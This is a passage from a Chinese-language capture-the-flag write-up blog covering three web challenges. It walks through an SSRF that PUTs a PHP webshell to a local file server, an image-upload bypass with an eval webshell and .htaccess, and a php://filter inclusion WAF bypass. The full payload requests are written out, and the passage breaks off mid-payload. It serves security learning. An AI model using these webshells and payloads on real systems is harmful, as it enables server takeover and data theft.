class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + formattedDate + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + fileSize + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;button onclick=&quot;viewFile(\&#x27;&#x27;</span> + item.name + <span class="hljs-string">&#x27;\&#x27;)&quot; style=&quot;margin-right: 5px;&quot;&gt;查看&lt;/button&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>                            &#125;);<br>                            <br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = resultHtml;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;没有找到匹配的图片&lt;/p&gt;&#x27;</span>;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;解析结果时出错&lt;/p&gt;&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;错误: &#x27;</span> + data.message + <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;搜索过程中发生错误&lt;/p&gt;&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">var</span> fileContentDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>);<br>                    fileContentDiv.textContent = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>                    <span class="hljs-keyword">var</span> img = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<br>                    img.src = data.base64_data;<br>                    img.style.maxWidth = <span class="hljs-string">&#x27;100%&#x27;</span>;<br>                    img.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                    img.style.margin = <span class="hljs-string">&#x27;0 auto&#x27;</span>;<br>                    fileContentDiv.<span class="hljs-title function_ invoke__">appendChild</span>(img);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;错误: &#x27;</span> + data.message;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                console.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;错误:&#x27;</span>, error);<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;获取图片时发生错误&#x27;</span>;<br>            &#125;);<br>        &#125;);<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">formatFileSize</span>(<span class="hljs-params">bytes</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0 B&#x27;</span>;<br>            <br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">k</span> = <span class="hljs-number">1024</span>;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sizes</span> = [<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;KB&#x27;</span>, <span class="hljs-string">&#x27;MB&#x27;</span>, <span class="hljs-string">&#x27;GB&#x27;</span>, <span class="hljs-string">&#x27;TB&#x27;</span>];<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">i</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">log</span>(bytes) / Math.<span class="hljs-title function_ invoke__">log</span>(k));<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">parseFloat</span>((bytes / Math.<span class="hljs-title function_ invoke__">pow</span>(k, i)).<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>)) + <span class="hljs-string">&#x27; &#x27;</span> + sizes[i];<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">viewFile</span>(<span class="hljs-params">filename</span>) </span>&#123;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;filename&#x27;</span>).value = filename;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">&#x27;submit&#x27;</span>));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>
<p>当时得到源码后不会做了  </p>
<p>赛后看官方解法：</p>
<p>ssrf</p>
<p>index.php在查看图片时使用file_get_contents获取任意文件并且以data:image&#x2F;jpeg;base64的形式返回，通过这种方式可以尝试读源码 源码中预留了带有dufs的变量名以及上传和搜索的流量特征都可以给选手推测的机会，选手如果运气好遍历到文件甚至可以直接下载到dufs的Linux二进制文件自行进行测试 同时，源码的file_get_contents还预留了options变量，这意味着可以通过此函数进行PUT请求上传任意文件，从而绕过php脚本的限制上传php木马getshell，之后从环境变量获取flag即可</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file_content = <span class="hljs-symbol">@file_get_contents</span>($filename, <span class="hljs-literal">false</span>, <span class="hljs-symbol">@stream_context_create</span>($_POST[<span class="hljs-string">&#x27;options&#x27;</span>]))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>攻击payload</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">83</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4103</span>.<span class="hljs-number">116</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">9</span><br><br><span class="hljs-attribute">action</span>=view&amp;filename=http://<span class="hljs-number">127.0.0.1:5000</span>/i.php&amp;options[http][method]=PUT&amp;options[http][content]=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+echo+getenv%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>FLAG%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure>
<p>传入部分url解码内容：<br><?php echo getenv('FLAG');?>   </p>
<p>原 http 请求：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50688<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>245<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEFvaPBTZNbCkhtbn<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">view</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;filename&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">index</span>.php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>

<p>关键利用代码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br></code></pre></td></tr></table></figure>
<p>这段代码会让stream_context_create函数接收post上来的option参数</p>
<p>关键来理解一下这份payload：  </p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">action=view&amp;filename=http://127.0.0.1:5000/shell.php&amp;options[http][method]=PUT&amp;options[http][content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>利用view操作来绕过upload操作的waf<br>源码的查看图片利用的是 file_get_contents() 支持http协议，用它来触发ssrf来向dufs(文件服务器来上传文件，而通过index.php的源码可以知道dufs文件服务运行在本地5000端口上)目录直接上传文件  </p>
<h2 id="options-http-method-PUT"><a href="#options-http-method-PUT" class="headerlink" title="options[http][method]&#x3D;PUT"></a><strong>options[http][method]&#x3D;PUT</strong></h2><p>用途：通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）。</p>
<p>攻击逻辑：</p>
<p>[method]&#x3D;PUT：将 HTTP 请求方法从默认的 GET 改为 PUT。</p>
<p>PUT 方法的作用：向服务器上传文件（需目标服务支持，如 dufs 允许 PUT 上传文件）。</p>
<p>为什么重要：通过此参数绕过常规文件上传限制，直接写入文件。<br>通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）将原来请求的GET改为PUT以向dufs服务上传木马  </p>
<h2 id="options-http-content-php-system-GET-‘a’"><a href="#options-http-content-php-system-GET-‘a’" class="headerlink" title="options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;"></a>options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;</h2><p>用途：设置 HTTP 请求的 Body 内容（即上传的文件内容）。</p>
<p>攻击逻辑：</p>
<?php system($_GET['a']);?><p>：一个简短的 PHP Webshell。</p>
<p>system()：执行系统命令。</p>
<p>$_GET[‘a’]：从 URL 参数 a 中接收用户输入的命令。</p>
<p>例如：访问 <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/shell.php?a=ls">http://127.0.0.1:5000/shell.php?a=ls</a> 会执行 ls 命令。</p>
<p>关键作用：将恶意代码写入服务器的 shell.php 文件，为后续攻击做准备。</p>
<h2 id="完整攻击流程"><a href="#完整攻击流程" class="headerlink" title="完整攻击流程"></a>完整攻击流程</h2><p>1.触发 SSRF   </p>
<p>服务器执行 file_get_contents 时，尝试读取 <a target="_blank" rel="noopener" href="http://127.0.0.1:5000/shell.php">http://127.0.0.1:5000/shell.php</a><br>但实际发起的是一个 PUT 请求。</p>
<p>2.上传 Webshell</p>
<p>请求内容为：<br>此时用stream_context_create构建的http请求应该就是如下了：  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/shell.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>PUT请求将会将shell.php和其指定内容写入dufs  </p>
<p>如果 dufs 允许 PUT 上传，shell.php 会被写入服务器。</p>
<p>所以第一个option用来定义put的http请求，第二个option用来定义http主体</p>
<p>接下来就是蚂蚁连马然后再环境变量里看到flag</p>
<h2 id="stream-context-create"><a href="#stream-context-create" class="headerlink" title="stream_context_create"></a>stream_context_create</h2><p>stream_context_create 是 PHP 中用于创建流上下文（stream context）的函数，它允许开发者在执行文件、网络或其他流操作时，自定义底层协议的行为（例如设置 HTTP 请求头、修改 FTP 传输模式等）。这个函数在实现复杂网络操作时非常有用，但如果使用不当，也可能引发安全漏洞（如 SSRF、文件上传绕过等）。</p>
<p>数的基本语法:</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">stream_context_create(array $options = ?,<span class="hljs-built_in"> array </span>$params = ?): resource<br></code></pre></td></tr></table></figure>
<p>参数：</p>
<p>$options：一个多维数组，用于配置不同协议（如 http、ftp、ssl 等）的行为。</p>
<p>$params（可选）：设置上下文参数（如超时时间）。</p>
<p>返回值：返回一个流上下文资源，可传递给其他流操作函数（如 file_get_contents、fopen）。</p>
<h1 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1><p>传正常图片，得到路径<br>然后试试直接传码，不行<br>修改请求头： </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>354<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrWwjxZ6YBiFAz2Lm<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748528050; HMACCOUNT=1B73E9281BD50EC7; PHPSESSID=fve350i8dhj45k2ls9htd4l6r5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;shell.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">这不传一个🐎？</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm--</span></span><br></code></pre></td></tr></table></figure>
<p>然后传.htaccess</p>
<p>蚂蚁直接连<br>env查看环境的到flag</p>
<h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>上来能看到给出的源码：  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-comment">//flag in /var/www/html/flag.php;</span><br></code></pre></td></tr></table></figure>

<p>直接传入flag&#x3D;flag.php<br>提示有waf<br>使用php伪协议结果一样<br>尝试读取index.php完整源码<br>flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;code&gt;&lt;span style=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;<br>&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-keyword">__FILE__</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);&lt;br /&gt;<span class="hljs-keyword">include</span>(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;<span class="hljs-string">&quot;flag&quot;</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;<span class="hljs-comment">//flag&amp;nbsp;in&amp;nbsp;/var/www/html/flag.php;&lt;/span&gt;</span><br>&lt;/span&gt;<br>&lt;/code&gt;&lt;br /&gt;<br></code></pre></td></tr></table></figure>

<p>看deepseek解释</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>))<br></code></pre></td></tr></table></figure>
<p>其中有&amp;&amp;效果与and相同，若是两个条件达成就会执行if<br>其中第一条是请求体长度小于800，第二是传入中含有flag字符<br>只要让其中一条为假就能绕过waf<br>所以让post的请求体长度大于800即可<br>例如：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">flag=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php&amp;a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa